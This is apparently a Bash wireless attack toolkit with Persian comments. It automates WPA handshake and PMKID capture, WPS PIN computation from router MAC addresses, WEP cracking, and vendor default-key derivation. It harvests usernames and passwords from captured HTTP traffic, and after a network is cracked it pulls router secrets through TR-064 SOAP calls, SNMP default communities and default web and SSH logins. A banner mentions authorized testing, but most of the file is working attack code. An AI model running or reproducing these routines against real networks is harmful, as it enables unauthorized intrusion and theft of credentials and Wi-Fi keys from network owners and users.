#!/usr/bin/env bash
# ==========================================================================
#  autopwn-ng — زنجیره کامل تست نفوذ وای‌فای
#  استفاده: sudo autopwn-ng [-p profile] [-t seconds] [-i iface] [-w wordlist]
#           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--no-harvest]
#           [--harvest-time N] [--target BSSID] [--auto] [--resume]
#           [--pmkid-only] [--from-pcap FILE] [--scope FILE] [--authorize] [--allow-all]
#           [--compute-wps-pins BSSID] [--parse-pcap FILE] [--wep] [--no-config-extract] [--no-default-psk] [--wps-state FILE] [--session NAME] [--restore] [--doctor] [--no-color] [--interactive] [--dry-run|--simulate]
#  پروفایل: stealth | normal | brute
# ==========================================================================
set -uo pipefail
export LC_ALL=C

PROFILE=normal
CAPTURE=120
CAPTURE_EXPLICIT=0
IFACE=""
IFACE2=""
DICTDIR="/opt/wordlists"
WORDLIST=""
DO_WPS=1
DO_TWIN=1
DO_POST=1
DO_HARVEST=1
HARVEST_TIME=30
TARGET=""
DRY_RUN=0
AUTO=0
RESUME=0
PMKID_ONLY=0
OFFLINE=0
FROM_PCAP=""
SCOPE_FILE=""
AUTHORIZED=0
ALLOW_ALL=0
WEP=0
DOCTOR=0
DEFAULT_PSK=1
CONFIG_EXTRACT=1
WPS_STATE="${WPS_STATE_FILE:-/tmp/wifite4-wps-state.tsv}"
RESTORE=0
COMPUTE_WPS_PINS=""
PARSE_PCAP=""
SESSION="autopwn-ng"
WLIMIT=3
CHECKPOINT="/tmp/autopwn-ng.checkpoint"
PMKID_N=0
EAPOL_N=0
EAP_N=0
WORK=""
NO_COLOR_FLAG=0
INTERACTIVE=0
TARGET_ESSID=""
TARGET_ROWS=""

# ---------- UI: palette + helpers (wifite2-style) ----------
if [[ -t 1 ]] && [ -z "${NO_COLOR:-}" ] && [ "${TERM:-dumb}" != dumb ]; then
  _c=$'\033[1;36m' _ok=$'\033[1;32m' _warn=$'\033[1;33m' _err=$'\033[1;31m'
  _hr=$'\033[1;35m' _dim=$'\033[2m' _bold=$'\033[1m' _blue=$'\033[1;34m' _mag=$'\033[1;35m'
  _rst=$'\033[0m'
else
  _c='' _ok='' _warn='' _err='' _hr='' _dim='' _bold='' _blue='' _mag='' _rst=''
fi
c(){ printf '%s[*]%s %s\n' "$_c" "$_rst" "$*"; }
ok(){ printf '%s[+]%s %s\n' "$_ok" "$_rst" "$*"; }
warn(){ printf '%s[!]%s %s\n' "$_warn" "$_rst" "$*"; }
err(){ printf '%s[-]%s %s\n' "$_err" "$_rst" "$*"; }
rule(){ printf '%s%s%s\n' "$_hr" "────────────────────────────────────────────────────────────" "$_rst"; }
hr(){ rule; }
phase(){ printf '\n%s▌%s %s%s%s\n' "$_mag" "$_rst" "$_bold" "$*" "$_rst"; rule; }
banner(){
  local line
  local -a art=(
'  ██╗    ██╗██╗███████╗██╗████████╗███████╗'
'  ██║    ██║██║██╔════╝██║╚══██╔══╝██╔════╝'
'  ██║ █╗ ██║██║█████╗  ██║   ██║   █████╗  '
'  ██║███╗██║██║██╔══╝  ██║   ██║   ██╔══╝  '
'  ╚███╔███╔╝██║██║     ██║   ██║   ███████╗'
'   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝   ╚══════╝'
  )
  printf '\n'
  for line in "${art[@]}"; do printf '%s%s%s\n' "$_mag" "$line" "$_rst"; done
  printf '  %s▸ autopwn-ng · wireless attack chain%s\n' "$_dim" "$_rst"
  printf '  %s▸ authorized testing only · wifite4 toolkit%s\n\n' "$_warn" "$_rst"
}
# نوار پیشرفت فقط روی ترمینال؛ در پایپ/CI همان sleep ساده
wait_bar(){
  local total="${1:-0}" label="${2:-waiting}" i filled pad bar
  if [ ! -t 1 ] || [ "$total" -lt 2 ]; then sleep "$total"; return; fi
  for ((i = 1; i <= total; i++)); do
    filled=$(( i * 24 / total ))
    printf -v bar '%*s' "$filled" ''
    bar=${bar// /█}
    printf -v pad '%*s' $((24 - filled)) ''
    printf '\r  %s▸%s %-24s %s[%s%s] %s%3d/%ds' "$_c" "$_rst" "$label" "$_dim" "$bar" "$pad" "$_rst" "$i" "$total"
    sleep 1
  done
  printf '\r%*s\r' 72 ''
}

# ---------- --doctor: health check ----------
doctor() {
  local pass=0 fail=0 warnn=0
  _check() {
    local cmd="$1" level="${2:-required}"
    if command -v "$cmd" >/dev/null 2>&1; then
      ok "  $cmd ... OK"
      pass=$((pass+1))
    elif [ "$level" = "required" ]; then
      err "  $cmd ... MISSING (required)"
      fail=$((fail+1))
    else
      warn "  $cmd ... missing (optional)"
      warnn=$((warnn+1))
    fi
  }
  banner
  phase "DOCTOR — health check"

  c "Required tools:"
  for t in aircrack-ng airmon-ng hcxdumptool hashcat hcxpcapngtool airodump-ng iw; do
    _check "$t" required
  done
  c "Optional tools:"
  for t in hcxhashtool macchanger mdk4 reaver bettercap hostapd-mana wifiphisher bully wash kismet tshark dnsmasq nmap jq xxd nmcli ip; do
    _check "$t" optional
  done

  hr
  c "GPU / OpenCL backend:"
  if command -v hashcat >/dev/null 2>&1; then
    local devinfo
    devinfo=$(hashcat -I 2>/dev/null | grep -iE 'device|opencl|cuda' | head -8)
    if [ -n "$devinfo" ]; then
      ok "  hashcat backend: available"
      printf '%s\n' "$devinfo" | sed 's/^/    /'
      pass=$((pass+1))
    else
      warn "  hashcat backend: no OpenCL/CUDA device detected"
      warnn=$((warnn+1))
    fi
  fi
  hr
  c "Wireless interfaces:"
  local ifaces=""
  if command -v iw >/dev/null 2>&1; then
    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
  fi
  if [ -z "$ifaces" ] && command -v ip >/dev/null 2>&1; then
    ifaces=$(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | grep -iE 'wlan|wlp|wifi' || true)
  fi
  local n
  n=$(printf '%s\n' "$ifaces" | grep -c . || true)
  if [ "$n" -gt 0 ]; then
    ok "  found $n wireless interface(s): $(printf '%s' "$ifaces" | tr '\n' ' ')"
    pass=$((pass+1))
  else
    warn "  no wireless interface detected (need monitor-mode capable adapter)"
    warnn=$((warnn+1))
  fi

  hr
  c "Wordlists:"
  if [ -d "$DICTDIR" ]; then
    ok "  $DICTDIR exists"
    pass=$((pass+1))
  else
    warn "  $DICTDIR not found"
    warnn=$((warnn+1))
  fi
  if [ -n "$WORDLIST" ]; then
    if [ -r "$WORDLIST" ]; then
      ok "  wordlist $WORDLIST readable"
      pass=$((pass+1))
    else
      err "  wordlist $WORDLIST not readable"
      fail=$((fail+1))
    fi
  fi
  for wl in /usr/share/wordlists/rockyou.txt /opt/wordlists/rockyou.txt; do
    if [ -r "$wl" ]; then
      ok "  found $wl"
      pass=$((pass+1))
    fi
  done

  hr
  c "Summary: $pass passed, $fail failed, $warnn warnings"
  [ "$fail" -eq 0 ]
}

handshake_quality() {
  # محاسبهٔ امتیاز (0-3): PMKID، EAPOL 4-way، MIC معتبر
  HS_SCORE=0
  HS_OK=0
  local mic_ok=1
  if [ -f "${WORK:-}/hcxtool.log" ]; then
    if grep -qiE 'invalid|error|bad[[:space:]]*mic|wrong[[:space:]]*mic|mic[[:space:]]*fail' "${WORK}/hcxtool.log" 2>/dev/null; then
      mic_ok=0
    fi
  fi
  [ "${PMKID_N:-0}" -gt 0 ] && HS_SCORE=$((HS_SCORE + 1))
  [ "${EAPOL_N:-0}" -ge 2 ] && HS_SCORE=$((HS_SCORE + 1))
  [ "$mic_ok" -eq 1 ] && [ "$HS_SCORE" -gt 0 ] && HS_SCORE=$((HS_SCORE + 1))
  if [ "${PMKID_N:-0}" -gt 0 ]; then
    HS_OK=1
  elif [ "${EAPOL_N:-0}" -ge 2 ] && [ "$mic_ok" -eq 1 ]; then
    HS_OK=1
  else
    HS_OK=0
  fi
}

extract_hashes() {
  hcxpcapngtool -o "$WORK/raw.hc22000" -E "$WORK/essids.txt" \
    --eapmschapv2="$WORK/mschapv2.txt" "$CAP" > "$WORK/hcxtool.log" 2>&1
  hcxhashtool -i "$WORK/raw.hc22000" -o "$HASH" --essid-group >/dev/null 2>&1 \
    || cp "$WORK/raw.hc22000" "$HASH" 2>/dev/null
  [ -s "$HASH" ] || { warn "هیچ هش WPA‌ای نبود."; : > "$HASH"; }
  PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
  EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
  if [ -f "$WORK/mschapv2.txt" ]; then EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || echo 0); else EAP_N=0; fi
  PMKID_N=${PMKID_N:-0}; EAPOL_N=${EAPOL_N:-0}; EAP_N=${EAP_N:-0}
  ok "PMKID: $PMKID_N | EAPOL: $EAPOL_N | Enterprise: $EAP_N"
}

# بررسی scope: آیا BSSID/SSID در فایل scope مجاز است؟
in_scope() {
  local bssid="${1:-}" essid="${2:-}"
  [ -z "$SCOPE_FILE" ] && return 0
  [ ! -f "$SCOPE_FILE" ] && return 1
  bssid="${bssid,,}"
  local line
  while IFS= read -r line || [ -n "$line" ]; do
    line="${line%%#*}"
    # trim whitespace
    line="$(printf '%s' "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
    [ -z "$line" ] && continue
    case "$line" in
      [0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:*)
        [ "${line,,}" = "$bssid" ] && return 0 ;;
      *)
        [ "$line" = "$essid" ] && return 0 ;;
    esac
  done < "$SCOPE_FILE"
  return 1
}

# ---------- اورکستراسیون WPS PIN (lockout-aware, resume) ----------
# فایل state: BSSID<TAB>lockout_until_epoch<TAB>tried_pins (comma)
wps_state_file() { printf '%s' "${WPS_STATE:-/tmp/wifite4-wps-state.tsv}"; }

wps_is_locked() {
  # $1 = bssid ; sleeps if currently locked
  local b="$1" now until wait
  [ -f "$(wps_state_file)" ] || return 0
  now=$(date +%s)
  until=$(awk -F'\t' -v b="$b" '$1==b{print $2}' "$(wps_state_file)" 2>/dev/null | head -1)
  [ -z "$until" ] && return 0
  if [ "$until" -gt "$now" ] 2>/dev/null; then
    wait=$((until - now))
    warn "WPS lockout on $b — waiting ${wait}s"
    sleep "$wait"
  fi
  return 0
}

wps_set_lockout() {
  # $1 = bssid ; $2 = seconds (default 60)
  local b="$1" secs="${2:-60}" now until tmp
  now=$(date +%s); until=$((now + secs))
  tmp="$(wps_state_file).tmp"
  if [ -f "$(wps_state_file)" ]; then
    awk -F'\t' -v b="$b" '$1!=b' "$(wps_state_file)" > "$tmp" 2>/dev/null
  else
    : > "$tmp"
  fi
  printf '%s\t%s\t\n' "$b" "$until" >> "$tmp"
  mv -f "$tmp" "$(wps_state_file)" 2>/dev/null
}

wps_detect_lockout() {
  # $1 = logfile ; $2 = bssid ; returns 0 if lockout detected
  [ -f "$1" ] || return 1
  if grep -qiE 'rate[[:space:]]*limit|0x02|locked[[:space:]]*out|transaction[[:space:]]*failed' "$1" 2>/dev/null; then
    wps_set_lockout "$2" 60
    warn "WPS lockout detected on $2 — recorded 60s window"
    return 0
  fi
  return 1
}

# ---------- الگوریتم‌های شناخته‌شدهٔ WPS PIN ----------
# مسیر یک فایل پایگاه دادهٔ همراه (env var یا جستجو در مسیرهای استاندارد)
db_path() {
  # $1 = filename, $2 = env var name (optional)
  local file="$1" envname="${2:-}"
  if [ -n "$envname" ] && [ -n "${!envname:-}" ] && [ -r "${!envname}" ]; then
    printf '%s' "${!envname}"
    return 0
  fi
  local d
  for d in "$(dirname "${BASH_SOURCE[0]}")" "$(pwd)" /usr/share/wifite4 /usr/local/share/wifite4; do
    [ -r "$d/$file" ] && { printf '%s' "$d/$file"; return 0; }
  done
  return 1
}

# مسیر پایگاه دادهٔ PINهای شناخته‌شده
wps_db_path() { db_path "wps-pins.db" WPS_DB; }

# wps_checksum: checksum استاندارد WPS PIN (7 رقم → 8 رقم)
wps_checksum() {
  local pin="$1" acc=0
  while [ ${#pin} -lt 7 ]; do pin="0$pin"; done
  local d1=${pin:0:1} d2=${pin:1:1} d3=${pin:2:1} d4=${pin:3:1}
  local d5=${pin:4:1} d6=${pin:5:1} d7=${pin:6:1}
  acc=$(( (3*(d1+d3+d5+d7) + (d2+d4+d6)) % 10 ))
  echo $(( (10 - acc) % 10 ))
}

# compute_wps_pins: تولید کاندیداهای PIN از BSSID (ComputePIN، EasyBox، D-Link، پیش‌فرض‌ها)
compute_wps_pins() {
  local bssid="$1"
  local mac="${bssid//:/}"
  mac="${mac,,}"
  [ ${#mac} -lt 12 ] && return 0
  local seen=""
  _emit() { case " $seen " in *" $1 "*) return 0;; esac; seen="$seen $1"; echo "$1"; }
  # ۰) پایگاه دادهٔ PINهای شناخته‌شده (OUI -> PIN)
  local db ouipfx
  db=$(wps_db_path 2>/dev/null || true)
  if [ -n "$db" ] && [ -r "$db" ]; then
    ouipfx="${mac:0:6}"
    ouipfx="${ouipfx^^}"
    while IFS= read -r line || [ -n "$line" ]; do
      line="${line%%#*}"
      line="${line// / }"
      # trim
      line="$(printf '%s' "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
      [ -z "$line" ] && continue
      read -r _oui _pin _rest <<<"$line"
      [ -z "$_oui" ] || [ -z "$_pin" ] && continue
      [ "${_oui^^}" = "$ouipfx" ] && _emit "$_pin"
    done < "$db"
  fi
  # ZhaoChunsheng ComputePIN (24-bit: آخرین ۳ اکتت)
  local nic=$((0x${mac:6:6}))
  local raw=$(( nic % 10000000 ))
  local p7; p7=$(printf '%07d' "$raw")
  local cs; cs=$(wps_checksum "$p7")
  _emit "${p7}${cs}"
  # 28-bit variant (آخرین ۴ اکتت & 0x0FFFFFFF)
  local four=$((0x${mac:4:8} & 0x0FFFFFFF))
  local raw28=$(( four % 10000000 ))
  p7=$(printf '%07d' "$raw28")
  cs=$(wps_checksum "$p7")
  _emit "${p7}${cs}"
  # D-Link variant
  local dl=$(( nic ^ 0x55AA55 ))
  dl=$(( dl ^ (((dl & 0x0F) << 4) + ((dl & 0x0F) << 8) + ((dl & 0x0F) << 12) + ((dl & 0x0F) << 16) + ((dl & 0x0F) << 20)) ))
  dl=$(( dl % 10000000 ))
  if [ "$dl" -lt 100000 ]; then
    dl=$(( dl + ((dl % 9) * 100000) + 100000 ))
  fi
  p7=$(printf '%07d' "$dl")
  cs=$(wps_checksum "$p7")
  _emit "${p7}${cs}"
  # PINهای پیش‌فرض رایج
  for p in 12345670 00000000 11111111 22222222 33333333 44444444 \
           55555555 66666666 77777777 88888888 99999999 12345678; do
    _emit "$p"
  done
}

# ---------- استخراج اعتبارنامهٔ HTTP از pcap ----------
parse_pcap_creds() {
  local pcap="$1"
  [ -s "$pcap" ] || return 0
  command -v tshark >/dev/null || return 0
  # ۱) Basic Authentication
  tshark -r "$pcap" -Y 'http.authorization contains "Basic"' -T fields \
    -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri -e http.authorization \
    2>/dev/null | while IFS=$'\t' read -r ts src host method uri auth; do
    [ -z "$auth" ] && continue
    b64="${auth#* }"
    creds=$(printf '%s' "$b64" | base64 -d 2>/dev/null)
    [ -z "$creds" ] && continue
    u="${creds%%:*}"; p="${creds#*:}"
    [ "$u" = "$creds" ] && p=''
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\tBasic\n' \
      "${ts:-}" "${src:-}" "${host:-}" "${method:-}" "${uri:-}" "$u" "$p" >> "$LOOT"
  done
  # ۲) فرم‌های POST (user/pass)
  tshark -r "$pcap" -Y 'http.request.method == "POST"' -T fields \
    -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data \
    2>/dev/null | while IFS=$'\t' read -r ts src host uri body; do
    [ -z "$body" ] && continue
    user=''; pass=''
    IFS='&' read -ra _kvs <<<"$body"
    for kv in "${_kvs[@]}"; do
      [[ "$kv" == *=* ]] || continue
      key="${kv%%=*}"; val="${kv#*=}"
      key_l="${key,,}"
      case "$key_l" in
        *user*|*login*|*email*|*account*|*name*) [ -z "$user" ] && user="$val";;
        *pass*|*pwd*|*secret*|*token*) [ -z "$pass" ] && pass="$val";;
      esac
    done
    if [ -n "$user" ] || [ -n "$pass" ]; then
      printf '%s\t%s\t%s\tPOST\t%s\t%s\t%s\tForm\n' \
        "${ts:-}" "${src:-}" "${host:-}" "${uri:-}" "$user" "$pass" >> "$LOOT"
    fi
  done
}

# ---------- کرک WEP (ARP replay / chopchop / fragmentation) ----------
crack_wep() {
  local bssid="$1" ch="${2:-}"
  [ -z "$bssid" ] && return 1
  command -v aircrack-ng >/dev/null 2>&1 || { warn "aircrack-ng یافت نشد — WEP رد شد."; return 1; }
  [ -n "${MON:-}" ] || { warn "مانیتور مود فعال نیست."; return 1; }
  local prefix="$WORK/wep-${bssid//:/}"
  local dump_pid arp_pid mac
  mac=$(ip link show "$MON" 2>/dev/null | awk '/link\/ether/{print $2; exit}')
  [ -n "$ch" ] && iw dev "$MON" set channel "$ch" >/dev/null 2>&1
  hr; c "WEP: برداشت IV از $bssid (کانال ${ch:-?})"
  airodump-ng --bssid "$bssid" -c "${ch:-1}" -w "$prefix" "$MON" >/dev/null 2>&1 &
  dump_pid=$!
  # تلاش ARP replay برای تولید IV
  if command -v aireplay-ng >/dev/null 2>&1; then
    sleep 3
    aireplay-ng -3 -b "$bssid" "$MON" > "$WORK/wep-arp-$bssid.log" 2>&1 &
    arp_pid=$!
    local i
    for i in $(seq 1 60); do
      sleep 5
      if [ -f "${prefix}-01.cap" ] && aircrack-ng "${prefix}-01.cap" 2>/dev/null | grep -qi 'KEY FOUND'; then
        break
      fi
    done
    kill "$arp_pid" 2>/dev/null; wait "$arp_pid" 2>/dev/null
  fi
  kill "$dump_pid" 2>/dev/null; wait "$dump_pid" 2>/dev/null
  # کرک با aircrack-ng (PTW سپس KoreK)
  if [ -f "${prefix}-01.cap" ]; then
    aircrack-ng -z "${prefix}-01.cap" > "$WORK/wep-crack-$bssid.txt" 2>&1 || \
      aircrack-ng -K "${prefix}-01.cap" > "$WORK/wep-crack-$bssid.txt" 2>&1
    local key
    key=$(grep -i 'KEY FOUND' "$WORK/wep-crack-$bssid.txt" | sed 's/.*\[ //;s/ \].*//' | head -1)
    if [ -n "$key" ]; then
      ok "WEP key: $key ($bssid)"
      printf '%s|%s|WEP\n' "$bssid" "$key" >> "$WORK/cracked.txt"
      return 0
    fi
  fi
  # fallback: chopchop / fragmentation
  if command -v aireplay-ng >/dev/null 2>&1 && [ -n "$mac" ]; then
    for atk in -4 -5; do
      c "WEP: حمله $atk روی $bssid"
      timeout 120 aireplay-ng $atk -b "$bssid" -h "$mac" "$MON" \
        > "$WORK/wep-$atk-$bssid.log" 2>&1 || true
    done
  fi
  warn "WEP: کلید برای $bssid یافت نشد."
  return 1
}

# ---------- تشخیص subnet شبکهٔ کرک‌شده ----------
detect_subnet() {
  local gw sub
  gw=$(ip -4 route 2>/dev/null | awk '/default/ {print $3; exit}')
  if [ -n "$gw" ]; then
    IFS=. read -r o1 o2 o3 _ <<<"$gw"
    sub="${o1}.${o2}.${o3}.0/24"
  fi
  printf '%s' "${sub:-192.168.1.0/24}"
}

# ---------- استخراج پیکربندی محلی (TR-064/UPnP, SNMP, Telnet/SSH, Web, Cloud, WPS) ----------
extract_local_config() {
  local b="$1" p="$2" gw ipaddr out="$REPORT/config-extracted.txt"
  [ -z "$b" ] && return 0
  : > "$out"
  echo "# Config extraction for $b ($p)" >> "$out"
  # gateway IP (best-effort: use default route)
  gw=$(ip -4 route 2>/dev/null | awk '/default/ {print $3; exit}')
  ipaddr="${gw:-192.168.1.1}"
  # ۱) TR-064 / UPnP: GetSecurityKeys / GetInfo
  if command -v curl >/dev/null 2>&1; then
    for path in '/upnp/control/WANIPConn1' '/tr64desc.xml' '/rootDesc.xml' '/igddesc.xml'; do
      curl -s -m 5 "http://$ipaddr$path" 2>/dev/null | head -c 2000 >> "$out" 2>/dev/null
      echo >> "$out"
    done
    # TR-064 GetSecurityKeys (SOAP)
    curl -s -m 5 -X POST "http://$ipaddr:49000/upnp/control/WLANConfiguration1" \
      -H 'Content-Type: text/xml; charset="utf-8"' \
      -H 'SOAPAction: "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"' \
      -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:GetSecurityKeys xmlns:u="urn:dslforum-org:service:WLANConfiguration:1"/></s:Body></s:Envelope>' \
      2>/dev/null | grep -oiE 'key(pass|phrase)?[^<]*' >> "$out" 2>/dev/null || true
  fi
  # ۲) SNMP default communities
  if command -v snmpwalk >/dev/null 2>&1; then
    for comm in public private admin; do
      snmpwalk -v2c -c "$comm" -t 2 -r 1 "$ipaddr" 1.3.6.1.4.1. 2>/dev/null | head -50 >> "$out"
    done
  fi
  # ۳) Web admin default creds
  if command -v curl >/dev/null 2>&1; then
    for creds in 'admin:admin' 'admin:password' 'admin:' 'root:root' 'root:admin'; do
      u="${creds%%:*}"; pw="${creds#*:}"
      code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 -u "$u:$pw" "http://$ipaddr/" 2>/dev/null)
      [ "$code" = "200" ] && echo "webadmin OK: $creds" >> "$out"
    done
  fi
  # ۴) Telnet/SSH default creds (best-effort, timeout)
  if command -v ssh >/dev/null 2>&1; then
    for creds in 'admin:admin' 'root:root' 'admin:password'; do
      u="${creds%%:*}"; pw="${creds#*:}"
      timeout 8 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        "$u@$ipaddr" 'cat /etc/wpa_supplicant.conf 2>/dev/null; nvram get wl0_wpa_psk 2>/dev/null' \
        >> "$out" 2>/dev/null || true
    done
  fi
  # ۵) WPS registrar PIN retrieval via reaver
  if command -v reaver >/dev/null 2>&1 && [ -n "${MON:-}" ]; then
    timeout 60 reaver -i "$MON" -b "$b" -c "${ch:-1}" -p '' -N -vv -d 5 \
      >> "$out" 2>&1 || true
  fi
  # استخراج PSK/PIN/admin از خروجی
  local _ext
  _ext=$(grep -oiE '(psk|passphrase|password|pin)[^ ]*' "$out" 2>/dev/null | head -20)
  [ -n "$_ext" ] && printf '%s\n' "$_ext" >> "$out"
  if [ -s "$out" ]; then
    ok "پیکربندی محلی استخراج شد: $out"
  else
    warn "هیچ پیکربندی‌ای استخراج نشد."
  fi
}

# ---------- استخراج PSK پیش‌فرض (SpeedTouch, D-Link, Netgear, ...) ----------
default_psk_db_path() { db_path "default-psk.db" DEFAULT_PSK_DB; }

derive_default_psks() {
  # $1 = BSSID, $2 = ESSID  -> prints candidate PSKs (one per line)
  local bssid="$1" essid="${2:-}"
  local mac="${bssid//:/}"; mac="${mac,,}"
  local db algo ouipfx
  db=$(default_psk_db_path 2>/dev/null || true)
  if [ -n "$db" ] && [ -r "$db" ]; then
    ouipfx="${mac:0:6}"; ouipfx="${ouipfx^^}"
    algo=$(awk -v o="$ouipfx" '$1==o{print $2; exit}' "$db" 2>/dev/null)
    case "$algo" in
      speedtouch|thomson)
        if [[ "$essid" =~ ^[Ss]peed[Tt]ouch([0-9A-Fa-f]{6})$ ]] || \
           [[ "$essid" =~ ^[Tt]homson([0-9A-Fa-f]{6})$ ]]; then
          local suffix="${BASH_REMATCH[1]}"
          local i serial
          for i in $(seq 0 65535); do
            serial=$(printf 'CP%04X%s' "$i" "$suffix")
            printf '%s' "$serial" | sha1sum 2>/dev/null | cut -c1-10 | tr 'a-f' 'A-F'
          done
        fi
        ;;
      alice)
        # Alice/AGPF: SHA256(MAC_bytes + serial) -> first 24 hex; serial = 12345 + 4 hex
        local i serial hexmac
        hexmac="$mac"
        for i in $(seq 0 65535); do
          serial=$(printf '12345%04X' "$i")
          printf '%s%s' "$hexmac" "$serial" | xxd -r -p 2>/dev/null | sha256sum 2>/dev/null | cut -c1-24
        done
        ;;
      dlink|netgear|tplink|huawei)
        # common default PSKs for these vendors
        printf '%s\n' admin password 12345678 12345670 00000000 11111111 admin123
        printf '%s\n' "${mac: -8}" "${mac: -6}"
        ;;
    esac
  fi
  # generic / MAC-derived candidates
  echo "$essid"
  printf '%s\n' "${mac:6:6}" "${mac:4:8}"
  # common defaults
  printf '%s\n' admin password 12345678 12345670 00000000 11111111 changeme default
}

# اجرای یک‌بارهٔ hcxdumptool برای برداشت (در background، HK_PID تنظیم می‌شود)
capture_once() {
  local hdr outflag
  hdr=$(hcxdumptool --help 2>&1 || true)
  grep -q -- '--filterlist_ap' <<<"$hdr" || { err "نسخه hcxdumptool ناشناخته."; return 1; }
  if grep -qE '^\s*-w[, ]' <<<"$hdr"; then outflag=-w; else outflag=-o; fi
  FILTER=()
  [ -n "${TARGET:-}" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
  hcxdumptool -i "$MON" "$outflag" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
  HK_PID=$!
}


while [ $# -gt 0 ]; do
  case "$1" in
    -p) PROFILE="$2"; shift 2;;
    -t) CAPTURE="$2"; CAPTURE_EXPLICIT=1; shift 2;;
    -i) IFACE="$2"; shift 2;;
    -I) IFACE2="$2"; shift 2;;
    -w) WORDLIST="$2"; shift 2;;
    -d) DICTDIR="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --no-wps) DO_WPS=0; shift;;
    --no-twin) DO_TWIN=0; shift;;
    --no-post) DO_POST=0; shift;;
    --no-harvest) DO_HARVEST=0; shift;;
    --harvest-time) HARVEST_TIME="$2"; shift 2;;
    --dry-run|--simulate) DRY_RUN=1; shift;;
    --doctor) DOCTOR=1; shift;;
    --no-color) NO_COLOR_FLAG=1; shift;;
    --interactive) INTERACTIVE=1; shift;;
    --auto) AUTO=1; shift;;
    --resume) RESUME=1; shift;;
    --pmkid-only) PMKID_ONLY=1; shift;;
    --from-pcap) FROM_PCAP="$2"; OFFLINE=1; shift 2;;
    --scope) SCOPE_FILE="$2"; shift 2;;
    --authorize|--i-am-authorized|--yes-i-am-authorized) AUTHORIZED=1; shift;;
    --allow-all) ALLOW_ALL=1; shift;;
    --restore) RESTORE=1; shift;;
    --session) SESSION="$2"; shift 2;;
    --compute-wps-pins) COMPUTE_WPS_PINS="$2"; shift 2;;
    --parse-pcap) PARSE_PCAP="$2"; shift 2;;
    --wep) WEP=1; shift;;
    --no-config-extract) CONFIG_EXTRACT=0; shift;;
    --no-default-psk) DEFAULT_PSK=0; shift;;
    --wps-state) WPS_STATE="$2"; shift 2;;
    -h|--help) banner; sed -n '2,8p' "$0"; exit 0;;
    *) err "گزینه ناشناس: $1"; exit 1;;
  esac
done

if [ "$NO_COLOR_FLAG" -eq 1 ] || [ -n "${NO_COLOR:-}" ]; then
  _c='' _ok='' _warn='' _err='' _hr='' _dim='' _bold='' _blue='' _mag='' _rst=''
fi

if [ -n "$COMPUTE_WPS_PINS" ]; then
  compute_wps_pins "$COMPUTE_WPS_PINS"
  exit 0
fi

if [ -n "$PARSE_PCAP" ]; then
  WORK="${WORK:-$(mktemp -d)}"
  REPORT="${REPORT:-$WORK}"
  LOOT="${LOOT:-$REPORT/loot.tsv}"
  mkdir -p "$REPORT"
  printf 'timestamp\tsource_ip\tdest_host\tmethod\turi\tusername\tpassword\ttype\n' > "$LOOT"
  parse_pcap_creds "$PARSE_PCAP"
  cat "$LOOT"
  exit 0
fi

if [ "$DOCTOR" -eq 1 ]; then
  doctor
  exit $?
fi

case "$PROFILE" in
  stealth)
    (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=240
    WLIMIT=1;;
  brute)
    (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=420
    WLIMIT=3;;
esac

# حالت خودکار: یک کلیک → اسکن، برداشت از همه، کرک، گزارش
if [ "$AUTO" -eq 1 ]; then
  PROFILE=normal
  CAPTURE=90
  ok "حالت خودکار: اسکن + برداشت از همه + کرک + گزارش"
fi

# حالت PMKID-only: برداشت کوتاه، در صورت یافتن PMKID مستقیم به کرک
if [ "$PMKID_ONLY" -eq 1 ]; then
  (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=15
  ok "حالت PMKID-only: برداشت ${CAPTURE}s، در صورت یافتن PMKID مستقیم به کرک"
fi

# ---------- تابع ذخیرهٔ checkpoint ----------
save_checkpoint() {
  local phase="$1"
  {
    printf 'CKPT_WORK=%q
' "$WORK"
    printf 'CKPT_PHASE=%d
' "$phase"
  } > "$CHECKPOINT"
}

# ---------- حالت resume ----------
SKIP_TO=0
if [ "$RESUME" -eq 1 ]; then
  if [ -f "$CHECKPOINT" ]; then
    # shellcheck disable=SC1090
    . "$CHECKPOINT"
    if [ -n "${CKPT_WORK:-}" ] && [ -d "$CKPT_WORK" ]; then
      WORK="$CKPT_WORK"
      SKIP_TO=$(( ${CKPT_PHASE:-0} + 1 ))
      ok "ادامه از فاز $SKIP_TO (آخرین فاز تکمیل‌شده: ${CKPT_PHASE:-0})"
      ok "دایرکتوری کار: $WORK"
    else
      warn "دایرکتوری کار در checkpoint پیدا نشد؛ شروع از اول."
      RESUME=0
    fi
  else
    warn "فایل checkpoint پیدا نشد؛ شروع از اول."
    RESUME=0
  fi
fi

# Create work directory if not resuming from checkpoint
if [ -z "${WORK:-}" ]; then
  WORK="$(mktemp -d /tmp/autopwn.XXXXXX)"
fi
POT="$WORK/hashcat.pot"
HASH="$WORK/targets.hc22000"
HC_BASE=(hashcat -m 22000 --potfile-path "$POT" -w "$WLIMIT" -O --force --session "$SESSION")
if [ "$OFFLINE" -eq 1 ]; then
  CAP="$FROM_PCAP"
else
  CAP="$WORK/capture.pcapng"
fi
REPORT="$WORK/report"
mkdir -p "$REPORT"
# اعتبارسنجی فایل pcap در حالت offline (فقط در اجرای واقعی)
